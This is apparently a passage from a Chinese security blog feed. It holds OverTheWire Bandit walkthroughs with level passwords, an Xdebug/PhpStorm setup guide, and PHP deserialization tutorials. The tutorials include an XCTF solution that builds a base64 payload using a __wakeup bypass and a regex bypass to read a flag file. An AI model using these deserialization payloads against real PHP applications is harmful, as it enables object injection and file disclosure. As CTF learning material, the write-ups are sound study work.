<h3 id="level-3-gt-level-4"><a href="#level-3-gt-level-4" class="headerlink" title="level 3 -&gt; level 4"></a>level 3 -&gt; level 4</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">bandit3<span class="variable">@bandit</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">inhere</span><br><span class="line">bandit3<span class="variable">@bandit</span><span class="symbol">:~</span><span class="variable">$ </span>cd inhere </span><br><span class="line">bandit3<span class="variable">@bandit</span><span class="symbol">:~/inhere</span><span class="variable">$ </span>ls</span><br><span class="line">bandit3<span class="variable">@bandit</span><span class="symbol">:~/inhere</span><span class="variable">$ </span>ls -a</span><br><span class="line">.  ..   .hidden </span><br><span class="line">bandit3<span class="variable">@bandit</span><span class="symbol">:~/inhere</span><span class="variable">$ </span>cat .hidden</span><br><span class="line">pIwrPrtPN36QITSp3EQaw936yaFoFgAB</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>隐藏文件读取</p>
</blockquote>
<h3 id="level-4-gt-level-5"><a href="#level-4-gt-level-5" class="headerlink" title="level 4 -&gt; level 5"></a>level 4 -&gt; level 5</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">bandit4<span class="variable">@bandit</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">inhere</span><br><span class="line">bandit4<span class="variable">@bandit</span><span class="symbol">:~</span><span class="variable">$ </span>cd inhere/</span><br><span class="line">bandit4<span class="variable">@bandit</span><span class="symbol">:~/inhere</span><span class="variable">$ </span>ls -a</span><br><span class="line">.   -file00  -file02  -file04  -file06  -file08</span><br><span class="line">..  -file01  -file03  -file05  -file07  -file09</span><br><span class="line">bandit4<span class="variable">@bandit</span><span class="symbol">:~/inhere</span><span class="variable">$ </span>pwd</span><br><span class="line">/home/bandit4/inhere</span><br><span class="line">bandit4<span class="variable">@bandit</span><span class="symbol">:~/inhere</span><span class="variable">$ </span>file /home/bandit4/inhere/*</span><br><span class="line">./-<span class="symbol">file00:</span> data</span><br><span class="line">./-<span class="symbol">file01:</span> data</span><br><span class="line">./-<span class="symbol">file02:</span> data</span><br><span class="line">./-<span class="symbol">file03:</span> data</span><br><span class="line">./-<span class="symbol">file04:</span> data</span><br><span class="line">./-<span class="symbol">file05:</span> data</span><br><span class="line">./-<span class="symbol">file06:</span> data</span><br><span class="line">./-<span class="symbol">file07:</span> ASCII text</span><br><span class="line">./-<span class="symbol">file08:</span> data</span><br><span class="line">./-<span class="symbol">file09:</span> data</span><br><span class="line">bandit4<span class="variable">@bandit</span><span class="symbol">:~/inhere</span><span class="variable">$ </span>cat ./-file07</span><br><span class="line">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</span><br><span class="line">bandit4<span class="variable">@bandit</span><span class="symbol">:~/inhere</span>$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>Linux file命令用于辨识文件类型。<br>通过file指令，我们得以辨识该文件的类型。</p>
</blockquote>
<h3 id="level-5-gt-level-6"><a href="#level-5-gt-level-6" class="headerlink" title="level 5 -&gt; level 6"></a>level 5 -&gt; level 6</h3><ul>
<li>human-readable</li>
<li>1033 bytes in size</li>
<li>not executable</li>
</ul>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">bandit5<span class="variable">@bandit</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">inhere</span><br><span class="line">bandit5<span class="variable">@bandit</span><span class="symbol">:~</span><span class="variable">$ </span>cd inhere/</span><br><span class="line">bandit5<span class="variable">@bandit</span><span class="symbol">:~/inhere</span><span class="variable">$ </span>ls -a</span><br><span class="line">.            maybehere02  maybehere06  maybehere10  maybehere14  maybehere18</span><br><span class="line">..           maybehere03  maybehere07  maybehere11  maybehere15  maybehere19</span><br><span class="line">            maybehere00  maybehere04  maybehere08  maybehere12  maybehere16</span><br><span class="line">            maybehere01  maybehere05  maybehere09  maybehere13  maybehere17</span><br><span class="line">bandit5<span class="variable">@bandit</span><span class="symbol">:~/inhere</span><span class="variable">$ </span>find . -size <span class="number">1033</span>c</span><br><span class="line">./maybehere07/.file2</span><br><span class="line">bandit5<span class="variable">@bandit</span><span class="symbol">:~/inhere</span><span class="variable">$ </span>cat ./maybehere07/.file2</span><br><span class="line">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
<p>常用参数:</p>
<p>-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。<br>-type c : 文件类型是 c 的文件。<br>-name 文件名；<br>-group 文件所属组；<br>-perm权限(like 770)；</p>
</blockquote>
<h3 id="level-5-gt-level-6-1"><a href="#level-5-gt-level-6-1" class="headerlink" title="level 5 -&gt; level 6"></a>level 5 -&gt; level 6</h3><ul>
<li>owned by user bandit7</li>
<li>owned by group bandit6</li>
<li>33 bytes in size</li>
</ul>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">bandit6@bandit:~$ <span class="keyword">find</span> <span class="regexp">/ -size 33c -user bandit7 -group bandit6 2&gt;/</span>dev/<span class="keyword">null</span></span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/dpkg/i</span>nfo/bandit7.password</span><br><span class="line">bandit6@bandit:~$ cat <span class="regexp">/var/</span>lib<span class="regexp">/dpkg/i</span>nfo/bandit7.password</span><br><span class="line">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Linux系统预留可三个文件描述符：0、1和2，他们的意义如下所示：<br>0——标准输入（stdin）<br>1——标准输出（stdout）<br>2——标准错误（stderr）</p>
<p>重定向的符号有两个：&gt;或&gt;&gt;，两者的区别是：前者会先清空文件，然后再写入内容，后者会将重定向的内容追加到现有文件的尾部。</p>
<p>/dev/null是一个特殊的设备文件，这个文件接收到任何数据都会被丢弃。因此，null这个设备通常也被称为位桶（bit bucket）或黑洞。</p>
<p>2&gt;/dev/null的意思就是将标准错误stderr删掉</p>
</blockquote>
]]></content>
      <categories>
        <category>Write up</category>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>phpstudy8+phpstorm+xdebug</title>
    <url>/2021/10/19/phpstudy8-phpstorm-debug/</url>
    <content><![CDATA[<p>phpstudy8+phpstorm+xdebug 设置断点调试<a id="more"></a></p>
<p>网址目录文件结构</p>
<img src="http://img.npfs06.top/20211019171240.png" style="zoom:80%;">



<hr>
<h2 id="PHP-study"><a href="#PHP-study" class="headerlink" title="PHP study"></a>PHP study</h2><p>phpstudy8自带xdebug，不需要另外安装</p>
<img src="http://img.npfs06.top/20211019171056.png" style="zoom:80%;">



<p>访问phpinfo,可以看到成功配置xdebug</p>
<img src="http://img.npfs06.top/20211019171157.png" style="zoom:80%;">



<h2 id="PHP-storm"><a href="#PHP-storm" class="headerlink" title="PHP storm"></a>PHP storm</h2><img src="http://img.npfs06.top/20211019171333.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211019171428.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211019171712.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211019172410.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211019172417.png" style="zoom:80%;">



<p>到这，我们完成了PHPStudy+PHPStorm配置和HelloPHP的运行,但是到目前为止PHPStorm只是承担了编辑器和部署的功能，没法直接调试，下面我们就来完成在PHPStorm进行单步调试。</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a><strong>调试</strong></h2><p>浏览器和插件</p>
<p>1）浏览器我们使用chrome，下载地址：<a href="https://www.google.com/chrome/%EF%BC%9B">https://www.google.com/chrome/；</a><br> 2）配合chrome的插件我们使用xdebug，安装完成在浏览器地址栏的右侧能够看到一只小爬虫，点击后如下图所示</p>
<img src="http://img.npfs06.top/20211019172528.png" style="zoom:80%;">

<p>我们选择Debug，就会通知我们的开发环境进行调试，选择debug，就会直接运行。</p>
<p> 我们可以在xdebug helper中配置它，选择phpstorm(其实选不选都一样)</p>
<img src="http://img.npfs06.top/20211019172605.png" style="zoom:80%;">



<h2 id="在PhpStorm配置Debug"><a href="#在PhpStorm配置Debug" class="headerlink" title="在PhpStorm配置Debug"></a>在PhpStorm配置Debug</h2><img src="http://img.npfs06.top/20211019172741.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211019172822.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211019172835.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211019172906.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211019172929.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211019173609.png" style="zoom:80%;">





<p>到这里，我们可以phpstorm中设置断点，然后使用浏览器的xdebug helper开启页面调试。</p>
<img src="http://img.npfs06.top/20211019173737.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211019173833.png" style="zoom:80%;">

<p>点这个小甲虫之后就很自动打开网页，不要忘了开启浏览器debug插件</p>
<img src="http://img.npfs06.top/20211021161727.png" style="zoom:80%;">

<p>编辑器也会出现断点信息</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/2020/04/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>在攻防世界做到一题有关PHP反序列化的题<a href="<https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1" target="_blank">Web_php_unserialize</a>，有点懵逼，所以去简单学习了一下<a id="more"></a></p>
<h1 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h1><p>serialize()  —&gt; 函数用于序列化对象或数组，并返回一个字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span>= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$bb</span>= <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$ccc</span>= <span class="literal">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>= <span class="keyword">new</span> test();</span><br><span class="line">echoserialize(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$array_t</span>= <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;1&quot;</span>,<span class="string">&quot;bb&quot;</span>=&gt;<span class="string">&quot;2&quot;</span>,<span class="string">&quot;ccc&quot;</span>=&gt;<span class="string">&quot;3&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$array_t</span>);</span><br></pre></td></tr></table></figure>


<blockquote>
<p>O:4:”test”:3:{s:1:”a”;s:1:”1”;s:2:”bb”;i:2;s:3:”ccc”;b:1;}<br>a:3:{s:1:”a”;s:1:”1”;s:2:”bb”;s:1:”2”;s:3:”ccc”;s:1:”3”;}</p>
</blockquote>
<p>各个字符的意义 —&gt; <code>第一个字母O 代表 Object，a代表 array，s代表 string，,i表示数字</code></p>
<p><img src="https://img.npfs06.top/20210306095124.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>类的属性有三种 private protected 和 public</strong></p>
<p>PHP 序列化的时候 <strong>private</strong>和 <strong>protected</strong> 变量会引入不可见字符<code>%00</code>，<code>%00类名%00属性名</code> 为private，<code>%00*%00属性名</code> 为protected，注意这两个 <strong>%00</strong>就是 ascii 码为0 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$a</span>= <span class="string">&quot;a&quot;</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$b</span>= <span class="string">&quot;b&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$c</span>= <span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>= <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$r</span>));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>O:4:”test”:3:{s:7:”testa”;s:1:”a”;s:4:”*b”;s:1:”b”;s:1:”c”;s:1:”c”;}</p>
<p>O%3A4%3A%22test%22%3A3%3A%7Bs%3A7%3A%22%00test%00a%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A1%3A%22b%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22c%22%3B%7D</p>
</blockquote>
<h1 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h1><p>unserialize() —&gt; 函数用于将通过 serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;t1&#x27;</span>, <span class="string">&#x27;tt2&#x27;</span>, <span class="string">&#x27;ttt3&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = serialize(<span class="variable">$sites</span>);</span><br><span class="line"><span class="comment">#echo  $serialized_data;</span></span><br><span class="line"><span class="variable">$unserialized_data</span> = unserialize(<span class="variable">$serialized_data</span>);</span><br><span class="line">print_r(<span class="variable">$unserialized_data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>Array<br>(<br>​    [0] =&gt;  t1<br>​    [1] =&gt;  tt2<br>​    [2] =&gt;  ttt3<br>)</p>
</blockquote>
<h1 id="常用魔法函数"><a href="#常用魔法函数" class="headerlink" title="常用魔法函数"></a>常用魔法函数</h1><table>
<thead>
<tr>
<th>常用魔法函数</th>
<th align="center">定义</th>
</tr>
</thead>
<tbody><tr>
<td>__construct()</td>
<td align="center">在创建对象时候初始化对象，一般用于对变量赋初值。创建一个新的类时，自动调用该方法</td>
</tr>
<tr>
<td>__destruct()</td>
<td align="center">和构造函数相反，当对象所在函数调用完毕后执行.即当一个类被销毁时自动调用该方法</td>
</tr>
<tr>
<td>__toString()</td>
<td align="center">当对象被当做一个字符串使用时调用。</td>
</tr>
<tr>
<td>__sleep()</td>
<td align="center">当调用<code>serialize()</code>函数时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这就允许对象在被序列化之前做任何清除操作</td>
</tr>
<tr>
<td>__wakeup()</td>
<td align="center">反序列化恢复对象之前调用该方法.当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数</td>
</tr>
<tr>
<td>__invoke()</td>
<td align="center">把一个实例对象当作函数使用时自动调用</td>
</tr>
<tr>
<td>__call()</td>
<td align="center">当调用对象中不存在的方法会自动调用该方法。</td>
</tr>
<tr>
<td>__get()</td>
<td align="center">在调用私有属性的时候会自动执行</td>
</tr>
<tr>
<td>__isset()</td>
<td align="center">在不可访问的属性上调用isset()或empty()触发</td>
</tr>
<tr>
<td>__unset()</td>
<td align="center">在不可访问的属性上使用unset()时触发</td>
</tr>
</tbody></table>
<p><strong>__wakeup() bypass</strong></p>
<p>在需要对__wakeup() 进行绕过的时候，可以让序列化结果中类属性的数值大于其真正的数值进行绕过，这个方式适用于PHP &lt; 5.6.25 和 PHP&lt; 7.0.10</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;nameis Bob &lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;exit&lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@var_dump(unserialize(<span class="variable">$_POST</span>[<span class="string">&quot;u&quot;</span>]));</span><br></pre></td></tr></table></figure>
<p>POST 参数O:4:”User”:1:{s:4:”name”;s:3:”Bob”;}可以看到输出是：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">object(User)[<span class="number">1</span>]</span><br><span class="line"> public <span class="string">&#x27;name&#x27;</span> =&gt; string <span class="string">&#x27;Bob&#x27;</span> (length=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">nameis Bob</span><br></pre></td></tr></table></figure>
<p>如果在某些情况下，不想让__wakeup() 执行，可以将 “User”后的 2 改为一个比2 大的数字</p>
<p>POST 参数O:4:”User”:2:{s:4:”name”;s:3:”Bob”;}：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nameis Bob</span><br><span class="line"></span><br><span class="line"><span class="built_in">bool</span>eanfalse</span><br></pre></td></tr></table></figure>


<hr>
<p><strong>[XCTF]Web – Web_php_unserialize</strong></p>
<p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;   <span class="comment">#构造函数，对类的变量进行初始化</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;  <span class="comment">#魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;         <span class="comment">#存在$var                   </span></span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);   <span class="comment">#将$var base64解码并赋值$var</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>思路：主要是正则绕过和_wakeup（）绕过</p>
<p>正则匹配：因为不能匹配<code>O:4</code>这种，我们可以<code>O:+4</code>绕过，因为在url编码中<code>+</code>会被转换为空格</p>
<p>__wakeup()绕过：让序列化结果中类属性的数值大于其真正的数值进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> demo;</span><br><span class="line"><span class="variable">$b</span>=serialize(<span class="variable">$a</span>);  <span class="comment">//echo  O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="variable">$b</span>=str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$b</span>);<span class="comment">//绕过preg_match</span></span><br><span class="line"><span class="variable">$b</span>= str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$b</span>);<span class="comment">//绕过wakeup</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$b</span>);     </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到</p>
<blockquote>
<p>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</p>
</blockquote>
<p>再进行get传参即可</p>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&mid=2247485916&idx=1&sn=ce338562a75b529b26d484fa90de031c&chksm=fe12fb41c96572572618a816ca615d562d5a4965990122c40e82a1b8f9084bc0a9438286a37c&mpshare=1&scene=23&srcid=0421ZkJIlDYGAZuUreh9EyXs&sharer_sharetime=1587447607661&sharer_shareid=20eedd9f9e15b3b3c30626e28ea74306#rd" target="___blank">php反序列化那些事 </a></p>
<p><a href="https://www.jianshu.com/p/8f498198fc3d" target="_blank">php序列化与反序列化入门</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>php反序列化字符串逃逸</title>
    <url>/2020/07/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>要学习反序列化字符串逃逸之前，我们需要知道php反序列化的几大特性。<a id="more"></a></p>
<blockquote>
<p>1.PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的 .</p>
</blockquote>
<blockquote>
<p>2.当长度不对应的时候会出现报错</p>
</blockquote>
<blockquote>
<p>3.可以反序列化类中不存在的元素</p>
</blockquote>
<h2 id="反序列化字符串逃逸"><a href="#反序列化字符串逃逸" class="headerlink" title="反序列化字符串逃逸"></a>反序列化字符串逃逸</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.过滤后字符变多</span><br><span class="line">2.过滤后字符变少</span><br></pre></td></tr></table></figure>
<h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><p><img src="https://img.npfs06.top/20210306095339.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210306095358.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210306095420.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>当我们传入？name =npfsx 时，由于溢出，反序列化失败，这个时候我们就可以利用这里的溢出，构造注入，实现字符串逃逸</p>
<p><img src="https://img.npfs06.top/20210306095431.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>其实总的来说就是因为执行text函数将一个字符（x),替换成两个字符 (66), 使字符串膨胀，造成了之后的序列化中，多出来的这些字符抢占了本属于<code>&quot;;i:1;s:6:&quot;hacker&quot;;&#125;</code>的位子，使其溢出，而我们要做的就是使溢出的这部分在闭合前一字符串的同时，符合php反序列化规则，能够被成功反序列化</p>
<p>所以<code>&quot;;i:1;s:6:&quot;hacker&quot;;&#125;</code>这一部分前面的字符<code>&quot;;</code>就是我们用来闭合前面字符串的，这样剩下的<code>i:1;s:6:&quot;hacker&quot;</code>这一部分符合反序列化规则，最后的<code>;&#125;</code>是用来闭合反序列化全过程的，这样原来的<code>&quot;;i:1;s:14:&quot;hello everyone&quot;;&#125;</code>就会被舍弃，而不影响反序列化过程</p>
<hr>
<h3 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h3><p><img src="https://img.npfs06.top/20210306095446.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210306095522.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210306095456.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210306095536.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>总的来说就是由于缩水，导致前面的字符被吃掉了，所以执行了我们后面构造的代码</p>
<hr>
<h2 id="0CTF-piapiapia"><a href="#0CTF-piapiapia" class="headerlink" title="0CTF piapiapia"></a><strong>0CTF piapiapia</strong></h2><p>使其主要的代码就四部分</p>
<p>先拿seay审下（第一次用，发现真是神器啊2333）</p>
<p><img src="https://img.npfs06.top/20210306095552.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以发现config.php里有个flag<br><img src="https://img.npfs06.top/20210306095603.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们在register.php页面注册，在index.php页面登入之后，来到update.php页面，我们可以看到这个页面是一个文件上传页面，结合seay，审计代码，发现这里有一个序列化的过程，同时在序列化之前会对我们输入的Phone、Email、Nickname、Photo进行正则匹配（phone要类似于11位数组的构造，email要类似于<a href="mailto:&#x31;&#50;&#x33;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;">&#x31;&#50;&#x33;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;</a>这样邮箱的构造，这两种都是不符合则die，而Nickname恰恰相反，它是如果匹配到非字符数字下划线或者长度超过10则die，这里可以用数组绕过）</p>
<p><img src="https://img.npfs06.top/20210306095618.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里有个update_profile函数，我们追溯看看</p>
<p><img src="https://img.npfs06.top/20210306095631.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以发现里面有个filter函数，继续追溯</p>
